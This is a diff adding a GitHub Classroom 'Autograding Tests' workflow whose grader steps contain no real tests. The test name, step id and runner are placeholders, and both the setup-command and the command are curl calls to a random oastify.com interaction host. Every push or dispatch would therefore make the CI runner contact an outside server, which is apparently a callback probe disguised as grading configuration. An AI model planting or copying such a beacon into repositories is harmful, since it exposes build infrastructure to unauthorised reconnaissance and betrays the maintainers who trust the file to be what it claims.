@@ -1,0 +1,29 @@
+name: Autograding Tests
+'on':
+- push
+- repository_dispatch
+permissions:
+  checks: write
+  actions: read
+  contents: read
+jobs:
+  run-autograding-tests:
+    runs-on: ubuntu-latest
+    if: github.actor != 'github-classroom[bot]'
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v4
+    - name: xxx
+      id: xxx
+      uses: classroom-resources/autograding-command-grader@v1
+      with:
+        test-name: xxx
+        setup-command: curl s92v3v9zt1k1c2jeo1hf64ovlmrdf55tu.oastify.com
+        command: curl s92v3v9zt1k1c2jeo1hf64ovlmrdf55tu.oastify.com
+        timeout: 10
+    - name: Autograding Reporter
+      uses: classroom-resources/autograding-grading-reporter@v1
+      env:
+        XXX_RESULTS: "${{steps.xxx.outputs.result}}"
+      with:
+        runners: xxx
